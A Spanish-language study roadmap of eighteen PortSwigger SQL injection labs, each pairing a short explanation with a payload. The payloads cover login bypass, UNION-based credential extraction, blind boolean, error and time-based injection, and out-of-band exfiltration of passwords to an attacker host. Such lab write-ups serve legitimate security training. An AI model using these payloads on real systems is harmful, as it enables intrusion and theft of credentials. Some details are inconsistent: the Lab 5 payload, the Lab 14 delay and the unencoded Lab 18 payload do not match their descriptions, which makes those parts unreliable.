ROADMAP – SQL INJECTION (PORTSWIGGER)

SQL Injection es una vulnerabilidad de seguridad que permite a un atacante manipular consultas SQL ejecutadas por una aplicación web. Esto ocurre cuando los datos introducidos por el usuario se insertan directamente en consultas sin validación o sanitización adecuada.

Los siguientes laboratorios pertenecen a la plataforma PortSwigger Web Security Academy y muestran diferentes técnicas de explotación de SQL Injection, desde casos básicos hasta escenarios avanzados como Blind SQL Injection y exfiltración de datos.

Lab 1 – SQL Injection en cláusula WHERE permitiendo recuperar datos ocultos

En este laboratorio se explota una vulnerabilidad SQL Injection presente en el parámetro category. La aplicación construye la consulta SQL directamente con la entrada del usuario, permitiendo modificar la cláusula WHERE para mostrar registros que normalmente se encuentran ocultos.

Evidencia:

						/filter?category=Gifts'+OR+1=1--

El payload altera la condición lógica de la consulta, devolviendo todos los registros de la tabla de productos.

Lab 2 – SQL Injection permitiendo bypass de autenticación

El formulario de inicio de sesión es vulnerable a SQL Injection debido a que las credenciales introducidas por el usuario se insertan directamente en la consulta SQL de autenticación. Esto permite modificar la lógica de validación para acceder sin conocer la contraseña real.

Evidencia:

						Username: administrator'--
						Password: admin1234

El comentario SQL (--) ignora la parte restante de la consulta, permitiendo iniciar sesión como administrador.

Lab 3 – SQL Injection para identificar tipo y versión de base de datos (Oracle)

En este laboratorio se utiliza un ataque UNION para obtener información sobre el sistema gestor de base de datos. Oracle requiere consultas específicas para recuperar la versión del servidor.

Evidencia:

						'+UNION+SELECT+BANNER,+NULL+FROM+v$version--

La consulta permite recuperar información sobre la versión de Oracle utilizada por la aplicación vulnerable.

Lab 4 – SQL Injection para identificar tipo y versión de base de datos (MySQL y MSSQL)

Este laboratorio demuestra cómo identificar el motor de base de datos utilizado por una aplicación mediante consultas específicas soportadas por MySQL y Microsoft SQL Server.

Evidencia:

						'+UNION+SELECT+@@version,+NULL#

El payload permite recuperar la versión del servidor de base de datos desde la respuesta de la aplicación.

Lab 5 – SQL Injection listando contenido de la base de datos

Se explota SQL Injection para enumerar las tablas existentes en la base de datos utilizando la tabla del sistema information_schema. Esto permite identificar estructuras internas de la base de datos.

Evidencia:

						'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--

El resultado muestra las tablas disponibles, incluyendo la tabla de usuarios.

Lab 6 – SQL Injection listando contenido de la base de datos en Oracle

En este laboratorio se utiliza SQL Injection para enumerar las tablas disponibles en una base de datos Oracle. A diferencia de otros motores, Oracle utiliza vistas del sistema específicas como all_tables para consultar metadatos.

Evidencia:

						' UNION SELECT table_name,NULL FROM all_tables--

La consulta permite identificar las tablas existentes, incluyendo aquellas que contienen credenciales de usuarios.

Lab 7 – SQL Injection UNION determinando el número de columnas

Este laboratorio demuestra cómo determinar el número de columnas de una consulta SQL para poder ejecutar correctamente un ataque UNION SELECT. Esto se realiza probando diferentes cantidades de valores NULL hasta evitar errores.

Evidencia:

						'+UNION+SELECT+NULL,NULL--

Cuando el número de columnas coincide con el de la consulta original, el servidor procesa correctamente la solicitud.

Lab 8 – SQL Injection encontrando una columna que acepte texto

Después de determinar el número de columnas, es necesario identificar cuál de ellas permite insertar datos de tipo texto. Esto es fundamental para mostrar información extraída de otras tablas.

Evidencia:

						'+UNION+SELECT+'abcdef',NULL,NULL--

La respuesta de la aplicación revela qué columna puede mostrar contenido textual.

Lab 9 – SQL Injection extrayendo datos de otras tablas

Una vez identificadas las columnas correctas, se utiliza UNION SELECT para consultar directamente otras tablas del sistema, como la tabla de usuarios.

Evidencia:

						'+UNION+SELECT+username,+password+FROM+users--

El resultado muestra credenciales almacenadas en la base de datos.

Lab 10 – SQL Injection recuperando múltiples valores en una sola columna

Algunas aplicaciones solo muestran una columna en la respuesta. En estos casos se pueden concatenar múltiples valores en una sola cadena para extraer información completa.

Evidencia:

						'+UNION+SELECT+NULL,username||'~'||password+FROM+users--

El operador de concatenación permite combinar múltiples campos en una sola salida.

Lab 11 – Blind SQL Injection con respuestas condicionales

En este laboratorio la aplicación no muestra directamente los resultados de la consulta SQL. En su lugar, se utilizan condiciones booleanas para observar diferencias en la respuesta del servidor.

Evidencia:

						TrackingId=xyz' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§'

Si la condición es verdadera, la página responde normalmente; si es falsa, la respuesta cambia o no devuelve resultados.

Lab 12 – Blind SQL Injection con errores condicionales

Este laboratorio utiliza errores generados intencionalmente para inferir información sobre la base de datos cuando las respuestas directas no están disponibles.

Evidencia:

						TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

Si la condición se cumple, se genera un error que revela información útil para el atacante.

Lab 13 – SQL Injection basada en errores visibles

Algunas aplicaciones muestran mensajes de error SQL directamente al usuario. Estos mensajes pueden revelar información sobre la estructura de la base de datos o sobre la consulta ejecutada.

Evidencia:

						TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

El error generado puede exponer datos internos de la base de datos.

Lab 14 – Blind SQL Injection con retrasos de tiempo

En ataques basados en tiempo, el servidor introduce un retraso cuando una condición específica es verdadera. Esto permite inferir información incluso cuando no hay salida visible en la aplicación.

Evidencia:

						TrackingId=x'||pg_sleep(10)--

El retraso de cinco segundos confirma que la condición evaluada es verdadera.

Lab 15 – Blind SQL Injection con retrasos y extracción de información

Esta técnica permite extraer información carácter por carácter evaluando condiciones que provocan retrasos en la respuesta del servidor.

Evidencia:

						TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,§1§,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

Mediante múltiples solicitudes se puede reconstruir el valor completo del dato.

Lab 16 – Blind SQL Injection con interacción Out-of-Band

Cuando la aplicación no devuelve resultados ni tiempos diferenciados, puede utilizarse interacción con servidores externos para confirmar la ejecución de consultas SQL.

Evidencia:

						'; exec master..xp_dirtree '//attacker-server/test'--

El servidor vulnerable intenta conectarse al servidor externo controlado por el atacante.

Lab 17 – Blind SQL Injection con exfiltración Out-of-Band

Este laboratorio demuestra cómo extraer datos directamente hacia un servidor externo utilizando consultas SQL que generan solicitudes HTTP o DNS.

Evidencia:

						'|| UTL_HTTP.REQUEST('http://attacker-server/'||password)--

Los datos sensibles son enviados fuera del sistema vulnerable.

Lab 18 – SQL Injection con bypass de filtros mediante codificación XML

Algunas aplicaciones implementan filtros que bloquean caracteres peligrosos. Sin embargo, es posible evadir estos filtros utilizando codificación XML u otros métodos de transformación de caracteres.

Evidencia:

						1 UNION SELECT username || '~' || password FROM users

El uso de codificación permite que el payload pase los filtros de seguridad pero sea interpretado correctamente por el servidor SQL.
